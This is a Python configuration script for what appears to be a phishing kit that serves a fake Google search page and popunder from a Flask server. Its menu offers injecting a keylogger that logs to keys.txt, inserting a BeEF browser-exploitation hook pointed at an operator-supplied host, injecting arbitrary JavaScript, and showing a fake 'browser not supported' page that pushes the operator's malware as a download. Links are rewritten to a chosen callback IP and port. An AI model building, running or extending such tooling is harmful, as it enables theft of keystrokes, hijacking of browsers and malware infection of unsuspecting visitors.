import platform

#OS configuration stuff
current_platform = platform.platform()
IS_WINDOWS = False
if current_platform.startswith("Windows"):
	IS_WINDOWS = True




#the flask server will run on this ip and port
h = input("ip to run on: ")
p = input("port to run on: ")
maldown=""
ipb=""

#menu
print('''
prebuilt pages will not be injected since you may want to use them for custom attacks.
you may however find the script you wish to use and add it to the bottom of your html file.
to use premade pages simply place your html file in the templates folder as <search term>.html 

1. inject keylogger (writes to keys.txt)
2. inject BeEF hook
3. inject custom html or js from file
4. browser is not supported download the app (your malware)
	''')

#choose here
opt = int(input("option: "))

#inject BeEF hook
if opt == 2:
	beef_ip=input("BeEF ip: ")
	beef_port=input("BeEF port: ")
	bhooktmp = open("bhook.js","r")
	bhooktmpr = bhooktmp.read()
	bhooktmp.close()
	bhooktmpr = bhooktmpr.replace("~bip~",beef_ip).replace("~bport~",beef_port)
	if IS_WINDOWS:
		bhook = open("static\\js\\bhook.js", "w")
	else:
		bhook = open("static/js/bhook.js","w")
	bhook.write(bhooktmpr)
	bhook.close()

#inject custom html or js
if opt == 3:
	injfname=input("filename: ")

if opt == 4:
	maldown=input("filename: ")

ipb = input("\nip to call back to and replace links with (leave blank for same ip): ")
portb = input("port (leave blank for same port): ")
if not ipb:
	ipb = h
	print("\nusing same ip")
if not portb:
	portb = p
	print("using same port")
print('''
	popunder location /u (might not work well on firefox sollution coming in v2.0)
	google search location / 
	''')
